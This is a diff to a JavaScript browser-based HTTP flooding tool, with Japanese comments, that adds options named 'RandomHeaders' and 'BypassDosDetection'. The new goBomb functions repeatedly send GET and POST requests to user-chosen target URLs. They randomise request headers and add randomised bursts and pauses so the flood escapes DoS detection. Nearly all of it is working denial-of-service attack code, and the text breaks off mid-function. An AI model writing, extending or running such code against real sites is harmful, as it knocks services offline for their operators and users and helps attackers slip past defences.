@@ -27,13 +27,20 @@
 	var count = "15";
 	var attackmode;
 	var lang = "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7";
+    var Langs = ['af,en-US;q=0.8,en;q=0.7','ar-sa,en-US;q=0.8,en;q=0.7','As,en-US;q=0.8,en;q=0.7','az-Latn,en-US;q=0.8,en;q=0.7','be,en-US;q=0.8,en;q=0.7','ca-ES-valencia,en-US;q=0.8,en;q=0.7','de-de,en-US;q=0.8,en;q=0.7','fil-Latn,en-US;q=0.8,en;q=0.7','fr-FR,en-US;q=0.8,en;q=0.7','et,en-US;q=0.8,en;q=0.7','eu,en-US;q=0.8,en;q=0.7','el,en-US;q=0.8,en;q=0.7','es-ES,en-US;q=0.8,en;q=0.7','ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7','en-US;q=0.9,en;q=0.8'];
 	var contype = "application/x-www-form-urlencoded";
+    var Contypes = ['text/plain','text/html','application/json','application/x-www-form-urlencoded'];
 	var accept = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
-	var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
+	var Accepts = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','text/html, application/xhtml+xml, image/jxr, */*','text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1'];
+    var ifmoded = "Thu, 01 Jun 1970 00:00:00 GMT";
 	var IsUrlVaild;
 	var IsPostdataVaild;
     var targetsurl, targetsurlLength, spicifiedurl;
-    // const randRange = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
+    var RandH, BypassDos
+    var BDnum = 60
+    var IsRandH
+    const randRange = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
+    const my_sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 	//変数の一斉定義(boonv3.7から流用)--------------------------------------------
 
 var i,iwc,wch,wch_url;
@@ -214,12 +221,17 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 				alert("[エラー] 対象URLを入力してください。")
     		IsUrlVaild = 0
 			}
+            RandH = document.getElementById('RandomHeaders');
+            BypassDos = document.getElementById('BypassDosDetection');
 		//ここまで---------------------------------------------------
 		return [wch, wch_url, tl, tl_url, IsUrlVaild, IsPostdataVaild]
 	}
 
-	function modeselect(mode) {
-		if(mode==1){
+  function modeselect(mode) {
+     if(RandH.checked) {
+        console.log("Random Headers enabled");
+        console.log("mode: " + mode + " wch: " + wch + " wch_url: " + wch_url);
+        if(mode==1){
 			if(wch==0){
 				if(wch_url==0) {
 					m_toDoing = setTimeout("goBomb_nowild()", m_inInterval);
@@ -249,19 +261,36 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 			}
 		}
 		} else if(mode==3) {
+          if(BypassDos.checked) {
+
+            if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_RandH_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_RandH_BypassDos()", m_inInterval);
+			}
+		} else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_RandH_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_RandH_BypassDos()", m_inInterval);
+			}
+          }
+
+          } else {
 			if(wch==0) {
 			if(wch_url==0) {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_RandH()", m_inInterval);
 			} else {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_RandH()", m_inInterval);
 			}
-		}
-		else {
+		} else {
 			if(wch_url==0) {
-				m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_RandH()", m_inInterval);
 			} else {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_RandH()", m_inInterval);
 			}
+          }
 		}
 		} else if(mode==4) {
 			if(wch==0){
@@ -293,19 +322,38 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 			}
 		}
 		} else if(mode==6) {
+          if(BypassDos.checked) {
+
+            if(wch==0) {
+			if(wch_url==0) {
+                console.log("goBomb_fetch_nowild_GET_ONLY_RandH_BypassDos ")
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY_RandH_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY_RandH_BypassDos()", m_inInterval);
+			}
+		} else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY_RandH_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY_RandH_BypassDos()", m_inInterval);
+			}
+          }
+
+          } else {
 			if(wch==0) {
 			if(wch_url==0) {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY()", m_inInterval);
+                console.log("goBomb_fetch_nowild_GET_ONLY_RandH ")
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY_RandH()", m_inInterval);
 			} else {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY_RandH()", m_inInterval);
 			}
-		}
-		else {
+		} else {
 			if(wch_url==0) {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY_RandH()", m_inInterval);
 			} else {
-				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY()", m_inInterval);
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY_RandH()", m_inInterval);
 			}
+          }
 		}
 		} else if(mode==7) {
 			if(wch==0){
@@ -322,6 +370,196 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 			}
 		}
 		} else if(mode==8) {
+          if(BypassDos.checked) {   
+            if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY_RandH_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY_RandH_BypassDos()", m_inInterval);
+			}
+		} else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY_RandH_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY_RandH_BypassDos()", m_inInterval);
+			}
+          }
+          } else {
+			if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY_RandH()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY_RandH()", m_inInterval);
+			}
+		} else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY_RandH()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY_RandH()", m_inInterval);
+			}
+          }
+		}
+		} else {
+			//スクリプト拡張補助
+			alert("[エラー] modeの値が不正です。")
+		}
+
+    } else {
+		if(mode==1){
+			if(wch==0){
+				if(wch_url==0) {
+					m_toDoing = setTimeout("goBomb_nowild()", m_inInterval);
+				} else {
+					m_toDoing = setTimeout("goBomb_nowild_wildurl()", m_inInterval);
+				}
+			}
+			else {
+				if(wch_url==0) {
+					m_toDoing = setTimeout("goBomb()", m_inInterval);
+				} else {
+					m_toDoing = setTimeout("goBomb_wildurl()", m_inInterval);
+				}
+			}
+		} else if(mode==2) {
+			if(wch==0){
+			if (wch_url==0) {
+				m_toDoing_XML = setTimeout("goBomb_XML_nowild()", m_inInterval);
+			} else {
+				m_toDoing_XML = setTimeout("goBomb_XML_nowild_wildurl()", m_inInterval);
+			}
+		} else {
+			if (wch_url==0) {
+				m_toDoing_XML = setTimeout("goBomb_XML()", m_inInterval);
+			} else {
+				m_toDoing_XML = setTimeout("goBomb_XML_wildurl()", m_inInterval);
+			}
+		}
+		} else if(mode==3) {
+          if(BypassDos.checked) {
+            if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_BypassDos()", m_inInterval);
+			}
+		}
+		else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_BypassDos()", m_inInterval);
+			}
+          }
+
+          } else {
+			if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl()", m_inInterval);
+			}
+		}
+		else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl()", m_inInterval);
+			}
+          }
+		}
+		} else if(mode==4) {
+			if(wch==0){
+				if(wch_url==0) {
+					m_toDoing = setTimeout("goBomb_nowild_GET_ONLY()", m_inInterval);
+				} else {
+					m_toDoing = setTimeout("goBomb_nowild_wildurl_GET_ONLY()", m_inInterval);
+				}
+			}
+			else {
+				if(wch_url==0) {
+					m_toDoing = setTimeout("goBomb_GET_ONLY()", m_inInterval);
+				} else {
+					m_toDoing = setTimeout("goBomb_wildurl_GET_ONLY()", m_inInterval);
+				}
+			}
+		} else if(mode==5) {
+			if(wch==0){
+			if (wch_url==0) {
+				m_toDoing_XML = setTimeout("goBomb_XML_nowild_GET_ONLY()", m_inInterval);
+			} else {
+				m_toDoing_XML = setTimeout("goBomb_XML_nowild_wildurl_GET_ONLY()", m_inInterval);
+			}
+		} else {
+			if (wch_url==0) {
+				m_toDoing_XML = setTimeout("goBomb_XML_GET_ONLY()", m_inInterval);
+			} else {
+				m_toDoing_XML = setTimeout("goBomb_XML_wildurl_GET_ONLY()", m_inInterval);
+			}
+		}
+		} else if(mode==6) {
+          if(BypassDos.checked) {
+            if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY_BypassDos()", m_inInterval);
+			}
+		}
+		else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY_BypassDos()", m_inInterval);
+			}
+          }
+          } else {
+			if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_GET_ONLY()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_GET_ONLY()", m_inInterval);
+			}
+		}
+		else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY()", m_inInterval);
+			}
+          }
+		}
+		} else if(mode==7) {
+			if(wch==0){
+			if (wch_url==0) {
+				m_toDoing_XML = setTimeout("goBomb_XML_nowild_POST_ONLY()", m_inInterval);
+			} else {
+				m_toDoing_XML = setTimeout("goBomb_XML_nowild_wildurl_POST_ONLY()", m_inInterval);
+			}
+		} else {
+			if (wch_url==0) {
+				m_toDoing_XML = setTimeout("goBomb_XML_POST_ONLY()", m_inInterval);
+			} else {
+				m_toDoing_XML = setTimeout("goBomb_XML_wildurl_POST_ONLY()", m_inInterval);
+			}
+		}
+		} else if(mode==8) {
+          if(BypassDos.checked) {
+            if(wch==0) {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_wildurl_POST_ONLY_BypassDos()", m_inInterval);
+			}
+		}
+		else {
+			if(wch_url==0) {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY_BypassDos()", m_inInterval);
+			} else {
+				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY_BypassDos()", m_inInterval);
+			}
+          }
+
+          } else {
 			if(wch==0) {
 			if(wch_url==0) {
 				m_toDoing_fetch = setTimeout("goBomb_fetch_nowild_POST_ONLY()", m_inInterval);
@@ -335,13 +573,16 @@ function convurlrandom(sbody,rndtmp1,rndtmp2){
 			} else {
 				m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY()", m_inInterval);
 			}
+          }
 		}
 		} else {
 			//スクリプト拡張補助
 			alert("[エラー] modeの値が不正です。")
 		}
 		
-	}
+    }
+
+}
 
 	function main()
 	{
@@ -868,6 +1109,70 @@ function goBomb_nowild_GET_ONLY()
 		m_toDoing_fetch = setTimeout("goBomb_fetch()", m_inInterval);
 	}
 
+    function goBomb_fetch_BypassDos()
+	{
+        console.log("goBomb_fetch_BypassDos");
+		var bomb;
+      for(j=0; j<10; j++) {  
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+        my_sleep(randRange(95, 120));
+      }
+		m_toDoing_fetch = setTimeout("goBomb_fetch_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_RandH()
+	{
+		var bomb;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_RandH_BypassDos()
+	{
+		var bomb;
+	for(j=0; j<10; j++) {
+		for(i = 0; i<randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_RandH_BypassDos()", randRange(2000, 2500));
+	}
+
 	function goBomb_fetch_GET_ONLY()
 	{
 		var bomb;
@@ -882,6 +1187,60 @@ function goBomb_nowild_GET_ONLY()
 		m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY()", m_inInterval);
 	}
 
+	function goBomb_fetch_GET_ONLY_BypassDos()
+	{
+		var bomb;
+	  for(j=0; j<10; j++) { 
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	  }
+		m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_GET_ONLY_RandH()
+	{
+		var bomb;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_GET_ONLY_RandH_BypassDos()
+	{
+		var bomb;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	  }
+		m_toDoing_fetch = setTimeout("goBomb_fetch_GET_ONLY_RandH_BypassDos()", randRange(2000, 2500));
+	}
+
 	function goBomb_fetch_POST_ONLY()
 	{
 		var bomb;
@@ -894,6 +1253,54 @@ function goBomb_nowild_GET_ONLY()
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY()", m_inInterval);
+	}
+
+	function goBomb_fetch_POST_ONLY_BypassDos()
+	{
+		var bomb;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_POST_ONLY_RandH()
+	{
+		var bomb;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_POST_ONLY_RandH_BypassDos()
+	{
+		var bomb;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fech POST
+			var req2 = new Request(bomb, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_POST_ONLY_RandH_BypassDos()", randRange(2000, 2500));
 	}
 	
 	function goBomb_fetch_wildurl()
@@ -913,6 +1320,69 @@ function goBomb_nowild_GET_ONLY()
 		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl()", m_inInterval);
 	}
 
+	function goBomb_fetch_wildurl_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_wildurl_RandH()
+	{
+		var bomb_url;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_wildurl_RandH_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_RandH_BypassDos()", randRange(2000, 2500));
+	}
+
 	function goBomb_fetch_wildurl_GET_ONLY()
 	{
 		var bomb_url;
@@ -927,6 +1397,60 @@ function goBomb_nowild_GET_ONLY()
 		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY()", m_inInterval);
 	}
 
+	function goBomb_fetch_wildurl_GET_ONLY_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_wildurl_GET_ONLY_RandH()
+	{
+		var bomb_url;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_wildurl_GET_ONLY_RandH_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) { 
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+            contype = Contypes[Math.floor(Math.random() * Contypes.length)];
+            lang = Langs[Math.floor(Math.random() * Langs.length)];
+            accept = Accepts[Math.floor(Math.random() * Accepts.length)];
+			//fetch GET
+			var req = new Request(bomb_url, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_GET_ONLY_RandH_BypassDos()", randRange(2000, 2500));
+	}
+
 	function goBomb_fetch_wildurl_POST_ONLY()
 	{
 		var bomb_url;
@@ -939,6 +1463,54 @@ function goBomb_nowild_GET_ONLY()
 		}
 		bombCounter();
 		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY()", m_inInterval);
+	}
+
+	function goBomb_fetch_wildurl_POST_ONLY_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY_BypassDos()", randRange(2000, 2500));
+	}
+
+    function goBomb_fetch_wildurl_POST_ONLY_RandH()
+	{
+		var bomb_url;
+		for(i = 0; i < m_inWinNum; i++)
+		{
+			bomb_url = convurl_url(1);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY_RandH()", m_inInterval);
+	}
+
+	function goBomb_fetch_wildurl_POST_ONLY_RandH_BypassDos()
+	{
+		var bomb_url;
+		for(j=0; j<10; j++) {
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+			bomb_url = convurl_url(1);
+			//fech POST
+			var req2 = new Request(bomb_url, { method: "POST", mode: "cors", cache: "no-cache", credentials: "same-origin", headers: { "Content-Type": "application/json"}, referrerPolicy: "no-referrer", body: JSON.stringify((convurl(1)))});
+			fetch(req2);
+		}
+		bombCounter();
+		my_sleep(randRange(95, 120));
+	}
+		m_toDoing_fetch = setTimeout("goBomb_fetch_wildurl_POST_ONLY_RandH_BypassDos()", randRange(2000, 2500));
 	}
 
 	function goBomb_fetch_nowild()
@@ -959,6 +1531,72 @@ function goBomb_nowild_GET_ONLY()
 		m_toDoing_fetch = setTimeout("goBomb_fetch_nowild()", m_inInterval);
 	}
 
+	function goBomb_fetch_nowild_BypassDos()
+	{
+		var bomb;
+		var postdata = postdata_from_user;
+		for(j=0; j<10; j++) { 
+		for(i = 0; i < randRange(15, 23); i++)
+		{
+            bomb = targetsurl[Math.floor(Math.random() * targetsurl.length)];
+			//fetch GET
+			var req = new Request(bomb, { headers: {"Content-Type": contype, "Accept-Language": lang, "Cache-Control": "no-cache", "Accept": accept, "If-Modified-Since": ifmoded } });
+			fetch(req);
+			//fech POST
